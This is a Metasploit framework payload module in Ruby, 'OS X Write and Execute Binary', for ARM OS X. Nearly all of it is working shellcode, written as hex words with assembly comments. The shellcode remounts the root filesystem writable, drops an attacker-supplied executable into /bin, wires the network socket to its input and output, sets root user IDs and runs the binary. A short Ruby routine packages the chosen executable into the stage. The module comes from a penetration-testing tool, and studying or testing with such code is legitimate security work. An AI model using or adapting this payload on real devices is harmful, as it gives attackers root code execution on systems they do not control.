##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X Write and Execute Binary',
      'Description'   => 'Spawn a command shell (staged)',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_ARMLE,
      'Session'       => Msf::Sessions::CommandShell,
      'Stage'         =>
        {
          'Payload' =>
            [
              # vfork
              0xe3a0c042, # mov r12, #0x42
              0xe0200000, # eor r0, r0, r0
              0xef000080, # swi 128
              0xe3500000, # cmp r0, #0x0
              0x0a000017, # beq _exit

              # remount root filesystem rw
              0xe3a0c0a7, # mov r12, #0xa7
              0xe28f0010, # add r0, pc, #0x10
              0xe28f1010, # add r1, pc, #0x10
              0xe28f3010, # add r3, pc, #0x10
              0xe0202000, # eor r2, r0, r0
              0xef000080, # swi 128
              0xea000002, # b get_filename

              # "hfs"
              0x00736668, # rsbeqs r6, r3, r8, ror #12
              # "/"
              0x0000002f, # andeq r0, r0, pc, lsr #32
              # NULL
              0x00000000, # andeq r0, r0, r0

              # get file name
              0xeb000007, # bl unlink_file

              # executable file name (/bin/msf_stage_xxxxxxxxxx.bin)
              0x6e69622f,
              0x66736d2f,
              0x6174735f,
              0x785f6567,
              0x78787878,
              0x78787878,
              0x6e69622e,
              0x00000000,

              # unlink file
              0xe1a0900e, # mov r9, lr
              0xe3a0c00a, # mov r12, #0xa
              0xe1a0000e, # mov r0, lr
              0xef000080, # swi 128

              # open file
              0xe3a0c005, # mov r12, #0x5
              0xe1a00009, # mov r0, r9
              0xe59f100c, # ldr r1, [pc, #12] ;[0x00001ed4] = 0x00000602
              0xe59f200c, # ldr r2, [pc, #12] ;[0x00001ed8] = 0x000001ed
              0xef000080, # swi 128
              0xe1a08000, # mov r8, r0
              0xea000001, # b get_data_pointer_a

              # open file parameters
              0x00000602, # READ_WRITE / TRUNC / CREATE
              0x000001ed, # 0755

              # get embedded data pointer
              0xea000020, # b get_embedded_data

              # write file
              0xe3a0c004, # mov r12, #0x4
              0xe1a00008, # mov r0, r8
              0xe28e1004, # add r1, lr, #0x4
              0xe49e2000, # ldr r2, [lr], #0
              0xef000080, # swi 128

              # close file
              0xe3a0c006, # mov r12, #0x6
              0xe1a00008, # mov r0, r8
              0xef000080, # swi 128

              # setup dup
              0xe3a05002, # mov r5, #0x2

              # dup2
              0xe3a0c05a, # mov r12, #0x5a
              0xe1a0000a, # mov r0, r10
              0xe1a01005, # mov r1, r5
              0xef000080, # swi 128
              0xe2455001, # sub r5, r5, #0x1
              0xe3550000, # cmp r5, #0x0
              0xaafffff8, # bge dup2

              # setreuid(0,0)
              0xe3a00000, # mov r0, #0x0
              0xe3a01000, # mov r1, #0x0
              0xe3a0c07e, # mov r12, #0x7e
              0xef000080, # swi 128

              # execve
              0xe0455005, # sub r5, r5, r5
              0xe1a0600d, # mov r6, sp
              0xe24dd020, # sub sp, sp, #0x20
              0xe1a00009, # mov r0, r9
              0xe4860000, # str r0, [r6], #0
              0xe5865004, # str r5, [r6, #4]
              0xe1a01006, # mov r1, r6
              0xe3a02000, # mov r2, #0x0
              0xe3a0c03b, # mov r12, #0x3b
              0xef000080, # swi 128

              # exit(0)
              0xe0200000, # eor r0, r0, r0
              0xe3a0c001, # mov r12, #0x1
              0xef000080, # swi 128

              # bounce back up
              0xebffffdd  # bl get_data_pointer_b

              # executable length value
              # executable data
            ].pack("V*")
        }
      ))
    register_options(
      [
        OptPath.new('PEXEC', [ true, "Full path to the file to execute",
          File.join(Msf::Config.install_root, "data", "ipwn", "ipwn")])
      ], self.class)
  end

  def generate_stage
    data = super

    begin
      print_status("Reading executable file #{datastore['PEXEC']}...")
      buff = ::IO.read(datastore['PEXEC'])
      data << [buff.length].pack("V")
      data << buff
      print_status("Read #{buff.length} bytes...")
    rescue
      print_error("Failed to read executable: #{$!}")
      return
    end

    if(data.length > (1024*1024*8))
      print_error("The executable and stage must be less than 8Mb")
      return
    end

    temp = Rex::Text.rand_text_alphanumeric(9)
    data.gsub("msf_stage_xxxxxxxxx.bin", "msf_stage_#{temp}.bin")
  end

end
